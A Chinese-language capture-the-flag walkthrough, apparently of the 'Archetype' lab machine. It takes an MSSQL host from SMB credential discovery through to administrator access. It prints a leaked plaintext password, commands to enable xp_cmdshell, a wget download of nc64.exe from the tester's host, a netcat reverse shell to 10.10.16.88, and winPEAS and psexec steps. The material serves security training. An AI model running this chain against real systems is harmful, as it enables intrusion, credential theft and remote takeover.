### 一、操作流程

1. 使用`nmap`工具扫描主机
> nmap -sC -sV 10.129.37.148
```shell
Nmap scan report for 10.129.37.148
Host is up (0.59s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
```

2. 登录smb查找敏感信息

> smbclient -N -L 10.129.37.148  #查看共享目录列表
> smbclient -N  10.129.37.148\\backups #进入共享目录
>  从smb服务器里面获取文件`prod.dtsConfig`,
```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 
```
> 获得mssql的用户（ARCHETYPE\sql_svc）和密码（M3g4c0rp123）：


3. Impacket工具的使用

- 安装

```shell
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt
```

- 连接数据库
> python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.37.148 -windows-auth  


- 开启命令行执行权限

```shell
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv
```

> 至此，可以直接使用cmd指令

4. 反弹shell
- 本地启动临时web服务：`python3 -m http.server 6000`
-  上传工具
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.88:6000/nc64.exe -outfile nc64.exe"

-  本地启动监听:`sudo nc -lvnp 443`
-  反弹shell
> EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;.\nc64.exe -e cmd.exe 10.10.16.88 443"

5. 权限提升
- 上传执行文件`winPEASx64.exe`
> wget http://10.10.16.88:6000/winPEASx64.exe -outfile winPEASx64.exe

- 执行文件`winPEASx64.exe`
> .\winPEASx641.exe

- 打开文件获取密码
> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


6. 主机登录psexec.py
>  ython3 psexec.py administrator@10.129.37.148 #登录后获取flag


### 知识点

1. mssql数据库配置指令sp_configure
   - sp_configure：更改配置项
   - RECONFIGURE：展示配置项

> EXEC sp_configure 'show advanced option', '1'; #允许展示高级配置选项，使用sp_configure即可展示配置项目
> EXEC sp_configure 'xp_cmdshell', 1; # 允许执行系统命令

2. xp_cmdshell命令行启动
3. 使用nc64.exe和winPEASx64.exe
4. Impacket工具的使用
5. nc工具
   - 监听端口(只连接)：`nc -l -p 端口`
    > sudo nc -l -p 443
   - 监听端口(持续)：`nc -L -p 端口`
   - 远程连接：`nc -nvv [ip] [PORT]`
winpeas